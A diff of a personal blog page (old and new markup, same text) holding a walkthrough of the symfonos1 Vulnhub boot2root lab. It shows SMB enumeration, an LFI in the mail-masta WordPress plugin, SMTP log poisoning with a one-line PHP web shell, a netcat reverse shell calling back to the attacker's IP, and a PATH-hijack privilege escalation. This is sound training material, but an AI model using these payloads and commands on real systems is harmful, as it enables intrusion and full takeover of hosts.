@@ -1,192 +1,25 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta http-equiv=content-language content="en">
-<meta name=color-scheme content="light dark">
-<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
-<meta name=author content="Kiel Vaughn">
-<meta name=description content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.
 Reconnaissance & Scanning    After importing into VMware Workstation and booting up the machine, I ran netdiscover -i eth0 to find the IP address of the machine.
-Now that we have located the IP address of our target, we can proceed with performing an nmap scan to search for open ports, protocols and their versions.">
-<meta name=keywords content="blog,cybersecurity,personal">
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="symfonos1 - Vulnhub Boot2Root">
-<meta name=twitter:description content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.
+Now that we have located the IP address of our target, we can proceed with performing an nmap scan to search for open ports, protocols and their versions."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="symfonos1 - Vulnhub Boot2Root"><meta name=twitter:description content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.
 Reconnaissance & Scanning    After importing into VMware Workstation and booting up the machine, I ran netdiscover -i eth0 to find the IP address of the machine.
-Now that we have located the IP address of our target, we can proceed with performing an nmap scan to search for open ports, protocols and their versions.">
-<meta property="og:title" content="symfonos1 - Vulnhub Boot2Root">
-<meta property="og:description" content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.
+Now that we have located the IP address of our target, we can proceed with performing an nmap scan to search for open ports, protocols and their versions."><meta property="og:title" content="symfonos1 - Vulnhub Boot2Root"><meta property="og:description" content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.
 Reconnaissance & Scanning    After importing into VMware Workstation and booting up the machine, I ran netdiscover -i eth0 to find the IP address of the machine.
-Now that we have located the IP address of our target, we can proceed with performing an nmap scan to search for open ports, protocols and their versions.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-06-27-symfonos1-walkthrough/"><meta property="article:section" content="ctfs">
-<meta property="article:published_time" content="2020-06-27T00:00:00+00:00">
-<meta property="article:modified_time" content="2020-06-27T00:00:00+00:00">
-<title>
-symfonos1 - Vulnhub Boot2Root · Kiel Vaughn, CISSP
-</title>
-<link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-06-27-symfonos1-walkthrough/>
-<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
-<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
-<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
-<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
-<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
-<link rel=apple-touch-icon href=/assets/img/cissp.ico>
-<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
-<meta name=generator content="Hugo 0.91.2">
-</head>
-<body class="preload-transitions colorscheme-dark">
-<main class=wrapper>
-<nav class=navigation>
-<section class=container>
-<a class=navigation-title href=/>
-Kiel Vaughn, CISSP
-</a>
+Now that we have located the IP address of our target, we can proceed with performing an nmap scan to search for open ports, protocols and their versions."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-06-27-symfonos1-walkthrough/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-06-27T00:00:00+00:00"><meta property="article:modified_time" content="2020-06-27T00:00:00+00:00"><title>symfonos1 - Vulnhub Boot2Root · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-06-27-symfonos1-walkthrough/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.94.2"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
 <input type=checkbox id=menu-toggle>
-<label class="menu-button float-right" for=menu-toggle>
-<i class="fa fa-bars fa-fw" aria-hidden=true></i>
-</label>
-<ul class=navigation-list>
-<li class=navigation-item>
-<a class=navigation-link href=/whoami/>whoami</a>
-</li>
-<li class=navigation-item>
-<a class=navigation-link href=/certifications/>certifications</a>
-</li>
-<li class=navigation-item>
-<a class=navigation-link href=/posts/>blog</a>
-</li>
-<li class=navigation-item>
-<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
-</li>
-</ul>
-</section>
-</nav>
-<div class=content>
-<section class="container post">
-<article>
-<header>
-<div class=post-title>
-<h1 class=title>
-<a class=title-link href=https://www.kielvaughn.com/ctfs/2020-06-27-symfonos1-walkthrough/>
-symfonos1 - Vulnhub Boot2Root
-</a>
-</h1>
-</div>
-<div class=post-meta>
-<div class=date>
-<span class=posted-on>
-<i class="fa fa-calendar" aria-hidden=true></i>
-<time datetime=2020-06-27T00:00:00Z>
-June 27, 2020
-</time>
-</span>
-<span class=reading-time>
-<i class="fa fa-clock-o" aria-hidden=true></i>
-4-minute read
-</span>
-</div>
-<div class=tags>
-<i class="fa fa-tag" aria-hidden=true></i>
-<span class=tag>
-<a href=/tags/vulnhub/>vulnhub</a>
-</span>
+<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-06-27-symfonos1-walkthrough/>symfonos1 - Vulnhub Boot2Root</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
+<time datetime=2020-06-27T00:00:00Z>June 27, 2020</time></span>
+<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
+4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/vulnhub/>vulnhub</a></span>
 <span class=separator>•</span>
-<span class=tag>
-<a href=/tags/symfonos/>symfonos</a>
-</span>
+<span class=tag><a href=/tags/symfonos/>symfonos</a></span>
 <span class=separator>•</span>
-<span class=tag>
-<a href=/tags/symfonos1/>symfonos1</a>
-</span>
+<span class=tag><a href=/tags/symfonos1/>symfonos1</a></span>
 <span class=separator>•</span>
-<span class=tag>
-<a href=/tags/boot2root/>Boot2Root</a>
-</span></div>
-</div>
-</header>
-<div>
-<p>Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.</p>
-<h2 id=reconnaissance--scanning>
-Reconnaissance & Scanning
-<a class=heading-link href=#reconnaissance--scanning>
-<i class="fa fa-link" aria-hidden=true></i>
-</a>
-</h2>
-<p>After importing into VMware Workstation and booting up the machine, I ran <code>netdiscover -i eth0</code> to find the IP address of the machine.</p>
-<p><img src=/assets/img/symfonos1-1.png alt="symfonos1 netdiscover"></p>
-<p>Now that we have located the IP address of our target, we can proceed with performing an <strong>nmap</strong> scan to search for open ports, protocols and their versions.</p>
-<p><img src=/assets/img/symfonos1-2.png alt="symfonos1 nmap"></p>
-<p>Based on the scan, we can see that ssh, smtp, netbios and smb are running, along with an Apache webserver on port 80. Visiting the webpage brings us to a page with nothing special on it, just a background image.</p>
-<p><img src=/assets/img/symfonos1-3.png alt="symfonos1 home page"></p>
-<p>At this point, I elected to run <strong>dirb</strong> to enumerate the website. It came back with minimal results using the big.txt wordlist, as it just had a list of Apache&rsquo;s manual directories.</p>
-<p><img src=/assets/img/symfonos1-4.png alt="symfonos1 dirb"></p>
-<p>I next turned my attention to SMB that was running over port 445. I was able to connect as an anonymous user using <strong>rpcclient</strong> as shown below.</p>
-<p><img src=/assets/img/symfonos1-5.png alt="symfonos1 rpcclient"></p>
-<p>Running <code>enumdomusers</code> results in a user, helios, being uncovered. Running <code>queryuser 0x3e8</code> displays info about that user. <code>getdompwinfo</code> displays that the minimum characters for the password are set to 5. However before attempting to brute force the password, I wanted to enumerate the smb shares based on the result of the <strong>nmap</strong> scan.</p>
-<p><img src=/assets/img/symfonos1-6.png alt="symfonos1 rpcclient info"></p>
-<p>Next, I ran the smb-enum-shares script with nmap to enumerate smb shares.</p>
-<p><img src=/assets/img/symfonos1-7.png alt="symfonos1 rpcclient nmap smb-enum-shares"></p>
-<p>This showed several different shares that could be connected to anonymously <strong>\192.168.68.137\anonymous, \192.168.68.137\IPC$,</strong> and <strong>\192.168.68.137\print$</strong>. There was also a <strong>\192.168.68.137\helios</strong> share present that anonymous/guest access was disabled on.</p>
-<p>At this point, I tried to connect to the shares anonymous could access to see if anything could be pilfered. This was done with <strong>smbclient</strong>. The anonymous share was the first to be checked. Upon connecting, there was an attention.txt file present.</p>
-<p><img src=/assets/img/symfonos1-8.png alt="symfonos1 smbclient anonymous share"></p>
-<p>I downloaded the file, dropped the smb connection, and read the file locally with <strong>cat</strong>.</p>
-<p><img src=/assets/img/symfonos1-9.png alt="symfonos1 smbclient attention.txt"></p>
-<p>This file lists 3 potential passwords, and we already uncovered the <strong>helios</strong> user earlier while running rpcclient. Let&rsquo;s try to connect to his share via SMB with these passwords.</p>
-<p><img src=/assets/img/symfonos1-10.png alt="symfonos1 smbclient helios share"></p>
-<p>Success, we were able to connect with the password of <strong>qwerty</strong> as helios to his directory. As shown above, there were two files in that directory we saved with <strong>get</strong>.</p>
-<p><img src=/assets/img/symfonos1-11.png alt="symfonos1 research.txt todo.txt"></p>
-<p>The <strong>research.txt</strong> file had info about Helios, but nothing relevant to enumerating further. The second file mentions a /h3l105 folder. Let&rsquo;s see what happens when we append this to the end of the website url.</p>
-<p><img src=/assets/img/symfonos1-12.png alt="symfonos1 research.txt h3l105"></p>
-<p>It appears that this is a wordpress site, but it is not loading completely because it&rsquo;s trying to access symfonos.local, lets add that to our attacking machine&rsquo;s host file and reload the page. This is done by running <code>nano /etc/hosts</code> and adding it as shown in the screenshot below:</p>
-<p><img src=/assets/img/symfonos1-13.png alt="symfonos1 etc/hosts"></p>
-<p>Once saved, reload the page again. You should now see the page properly and a login page. Next, we will use wp-scan to enumerate plugins for possible vulnerabilities.</p>
-<p><img src=/assets/img/symfonos1-14.png alt="symfonos1 wp-scan enumerate plugins"></p>
-<h2 id=exploitation>
-Exploitation
-<a class=heading-link href=#exploitation>
-<i class="fa fa-link" aria-hidden=true></i>
-</a>
-</h2>
-<p>You will come across mail-masta as one of the plugins in use. A quick Google search leads to an exploit for this on <a href=https://www.exploit-db.com/exploits/40290>Exploit-DB</a>.</p>
-<p><img src=/assets/img/symfonos1-15.png alt="symfonos1 LFI exploit"></p>
-<p>Modify the sample code and use the following url to pull a list of users on the system <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code>.</p>
-<p><img src=/assets/img/symfonos1-16.png alt="symfonos1 LFI etc/passwd"></p>
-<p>Now that we are sure that LFI works, we can attempt SMTP poisoning to utilize RCE. This is accomplished with running <code>telnet symfonos.local 25</code>.</p>
-<p><img src=/assets/img/symfonos1-17.png alt="symfonos1 smtp"></p>
-<p>We will now send an email to Helios with a 1 line of PHP code that allows for RCE: <code>&lt;?php system($_GET['c']); ?></code>.</p>
-<p><img src=/assets/img/symfonos1-18.png alt="symfonos1 smtp send"></p>
-<p>Navigating to <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=pwd</code> will print the working directory after the output of helios' mail.</p>
-<p><img src=/assets/img/symfonos1-19.png alt="symfonos1 smtp RCE"></p>
-<p>This means we should be able to create a reverse shell, lets create a netcat listener on our attacking machine with <code>nc -nvlp 5555</code> and then navigate to <code>symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/sh 192.168.68.135 5555</code> in the web browser and press enter, this should connect to your netcat listener.</p>
-<p><img src=/assets/img/symfonos1-20.png alt="symfonos1 website RCE">
-<img src=/assets/img/symfonos1-21.png alt="symfonos1 netcat connection"></p>
-<p>Next, we will create a TTY shell with <code>python -c 'import pty;pty.spawn("/bin/bash")'</code>.</p>
-<p><img src=/assets/img/symfonos1-22.png alt="symfonos1 python tty shell"></p>
-<p>Then, we will use the following <code>find / -perm -u=s -type f 2>/dev/null</code> to find all the programs that run with SUID.</p>
-<p><img src=/assets/img/symfonos1-23.png alt="symfonos1 find"></p>
-<p>One that stands out is <strong>/opt/statuscheck</strong> which has a <strong>curl</strong> command embedded in it when reviewing the binary with <code>strings /opt/statuscheck</code>.</p>
-<p><img src=/assets/img/symfonos1-24.png alt="symfonos1 statuscheck"></p>
-<p>We will take advantage of this by copying the bash shell into a curl binary in the temp directory and temporarily changing the $PATH variable to run this command instead of curl as shown below.</p>
-<p><img src=/assets/img/symfonos1-25.png alt="symfonos1 root shell"></p>
-<p>At this point you have root! Navigate to /root and run ls to list files, you should see <strong>proof.txt</strong>. Run <code>cat proof.txt</code> to view the contents of this file to finish the box.</p>
-<p><img src=/assets/img/symfonos1-26.png alt="symfonos1 root proof.txt"></p>
-</div>
-<footer>
-</footer>
-</article>
-</section>
-</div>
-<footer class=footer>
-<section class=container>
-©
+<span class=tag><a href=/tags/boot2root/>Boot2Root</a></span></div></div></header><div><p>Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning
+<a class=heading-link href=#reconnaissance--scanning><i class="fa fa-link" aria-hidden=true></i></a></h2><p>After importing into VMware Workstation and booting up the machine, I ran <code>netdiscover -i eth0</code> to find the IP address of the machine.</p><p><img src=/assets/img/symfonos1-1.png alt="symfonos1 netdiscover"></p><p>Now that we have located the IP address of our target, we can proceed with performing an <strong>nmap</strong> scan to search for open ports, protocols and their versions.</p><p><img src=/assets/img/symfonos1-2.png alt="symfonos1 nmap"></p><p>Based on the scan, we can see that ssh, smtp, netbios and smb are running, along with an Apache webserver on port 80. Visiting the webpage brings us to a page with nothing special on it, just a background image.</p><p><img src=/assets/img/symfonos1-3.png alt="symfonos1 home page"></p><p>At this point, I elected to run <strong>dirb</strong> to enumerate the website. It came back with minimal results using the big.txt wordlist, as it just had a list of Apache&rsquo;s manual directories.</p><p><img src=/assets/img/symfonos1-4.png alt="symfonos1 dirb"></p><p>I next turned my attention to SMB that was running over port 445. I was able to connect as an anonymous user using <strong>rpcclient</strong> as shown below.</p><p><img src=/assets/img/symfonos1-5.png alt="symfonos1 rpcclient"></p><p>Running <code>enumdomusers</code> results in a user, helios, being uncovered. Running <code>queryuser 0x3e8</code> displays info about that user. <code>getdompwinfo</code> displays that the minimum characters for the password are set to 5. However before attempting to brute force the password, I wanted to enumerate the smb shares based on the result of the <strong>nmap</strong> scan.</p><p><img src=/assets/img/symfonos1-6.png alt="symfonos1 rpcclient info"></p><p>Next, I ran the smb-enum-shares script with nmap to enumerate smb shares.</p><p><img src=/assets/img/symfonos1-7.png alt="symfonos1 rpcclient nmap smb-enum-shares"></p><p>This showed several different shares that could be connected to anonymously <strong>\192.168.68.137\anonymous, \192.168.68.137\IPC$,</strong> and <strong>\192.168.68.137\print$</strong>. There was also a <strong>\192.168.68.137\helios</strong> share present that anonymous/guest access was disabled on.</p><p>At this point, I tried to connect to the shares anonymous could access to see if anything could be pilfered. This was done with <strong>smbclient</strong>. The anonymous share was the first to be checked. Upon connecting, there was an attention.txt file present.</p><p><img src=/assets/img/symfonos1-8.png alt="symfonos1 smbclient anonymous share"></p><p>I downloaded the file, dropped the smb connection, and read the file locally with <strong>cat</strong>.</p><p><img src=/assets/img/symfonos1-9.png alt="symfonos1 smbclient attention.txt"></p><p>This file lists 3 potential passwords, and we already uncovered the <strong>helios</strong> user earlier while running rpcclient. Let&rsquo;s try to connect to his share via SMB with these passwords.</p><p><img src=/assets/img/symfonos1-10.png alt="symfonos1 smbclient helios share"></p><p>Success, we were able to connect with the password of <strong>qwerty</strong> as helios to his directory. As shown above, there were two files in that directory we saved with <strong>get</strong>.</p><p><img src=/assets/img/symfonos1-11.png alt="symfonos1 research.txt todo.txt"></p><p>The <strong>research.txt</strong> file had info about Helios, but nothing relevant to enumerating further. The second file mentions a /h3l105 folder. Let&rsquo;s see what happens when we append this to the end of the website url.</p><p><img src=/assets/img/symfonos1-12.png alt="symfonos1 research.txt h3l105"></p><p>It appears that this is a wordpress site, but it is not loading completely because it&rsquo;s trying to access symfonos.local, lets add that to our attacking machine&rsquo;s host file and reload the page. This is done by running <code>nano /etc/hosts</code> and adding it as shown in the screenshot below:</p><p><img src=/assets/img/symfonos1-13.png alt="symfonos1 etc/hosts"></p><p>Once saved, reload the page again. You should now see the page properly and a login page. Next, we will use wp-scan to enumerate plugins for possible vulnerabilities.</p><p><img src=/assets/img/symfonos1-14.png alt="symfonos1 wp-scan enumerate plugins"></p><h2 id=exploitation>Exploitation
+<a class=heading-link href=#exploitation><i class="fa fa-link" aria-hidden=true></i></a></h2><p>You will come across mail-masta as one of the plugins in use. A quick Google search leads to an exploit for this on <a href=https://www.exploit-db.com/exploits/40290>Exploit-DB</a>.</p><p><img src=/assets/img/symfonos1-15.png alt="symfonos1 LFI exploit"></p><p>Modify the sample code and use the following url to pull a list of users on the system <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code>.</p><p><img src=/assets/img/symfonos1-16.png alt="symfonos1 LFI etc/passwd"></p><p>Now that we are sure that LFI works, we can attempt SMTP poisoning to utilize RCE. This is accomplished with running <code>telnet symfonos.local 25</code>.</p><p><img src=/assets/img/symfonos1-17.png alt="symfonos1 smtp"></p><p>We will now send an email to Helios with a 1 line of PHP code that allows for RCE: <code>&lt;?php system($_GET['c']); ?></code>.</p><p><img src=/assets/img/symfonos1-18.png alt="symfonos1 smtp send"></p><p>Navigating to <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=pwd</code> will print the working directory after the output of helios&rsquo; mail.</p><p><img src=/assets/img/symfonos1-19.png alt="symfonos1 smtp RCE"></p><p>This means we should be able to create a reverse shell, lets create a netcat listener on our attacking machine with <code>nc -nvlp 5555</code> and then navigate to <code>symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/sh 192.168.68.135 5555</code> in the web browser and press enter, this should connect to your netcat listener.</p><p><img src=/assets/img/symfonos1-20.png alt="symfonos1 website RCE">
+<img src=/assets/img/symfonos1-21.png alt="symfonos1 netcat connection"></p><p>Next, we will create a TTY shell with <code>python -c 'import pty;pty.spawn("/bin/bash")'</code>.</p><p><img src=/assets/img/symfonos1-22.png alt="symfonos1 python tty shell"></p><p>Then, we will use the following <code>find / -perm -u=s -type f 2>/dev/null</code> to find all the programs that run with SUID.</p><p><img src=/assets/img/symfonos1-23.png alt="symfonos1 find"></p><p>One that stands out is <strong>/opt/statuscheck</strong> which has a <strong>curl</strong> command embedded in it when reviewing the binary with <code>strings /opt/statuscheck</code>.</p><p><img src=/assets/img/symfonos1-24.png alt="symfonos1 statuscheck"></p><p>We will take advantage of this by copying the bash shell into a curl binary in the temp directory and temporarily changing the $PATH variable to run this command instead of curl as shown below.</p><p><img src=/assets/img/symfonos1-25.png alt="symfonos1 root shell"></p><p>At this point you have root! Navigate to /root and run ls to list files, you should see <strong>proof.txt</strong>. Run <code>cat proof.txt</code> to view the contents of this file to finish the box.</p><p><img src=/assets/img/symfonos1-26.png alt="symfonos1 root proof.txt"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
 2020 -
 2022
-Kiel Vaughn
-</section>
-</footer>
-</main>
-<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
-</body>
-</html>
+Kiel Vaughn</section></footer></main><script src=/js/coder.min.f453d26c79f010446cf0d9770197f77de32c07b7a5512d141a286247fe154a22.js integrity="sha256-9FPSbHnwEERs8Nl3AZf3feMsB7elUS0UGihiR/4VSiI="></script></body></html>
